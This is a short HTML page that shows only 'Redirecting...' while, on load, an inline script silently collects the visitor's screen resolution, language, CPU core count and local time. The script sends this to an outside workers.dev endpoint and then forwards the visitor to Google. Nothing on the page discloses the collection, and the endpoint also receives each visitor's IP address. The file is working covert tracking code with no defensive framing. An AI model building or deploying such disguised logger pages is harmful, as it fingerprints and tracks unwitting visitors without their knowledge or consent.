<!DOCTYPE html>
<html>
<head>
    <script>
    const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";

    // Собираем данные браузера
        const data = {
        screen: window.screen.width + "x" + window.screen.height,
        lang: navigator.language,
        cores: navigator.hardwareConcurrency || "unknown",
        time: new Date().toLocaleString() // Добавили местное время устройства
    };


    // Отправляем данные в воркер
    fetch(workerUrl, {
        method: "POST",
        body: JSON.stringify(data)
    }).finally(() => {
        // После отправки — в Google
        window.location.href = "https://google.com";
    });
</script>

</head>
<body>
    <h1>Redirecting...</h1>
</body>
</html>
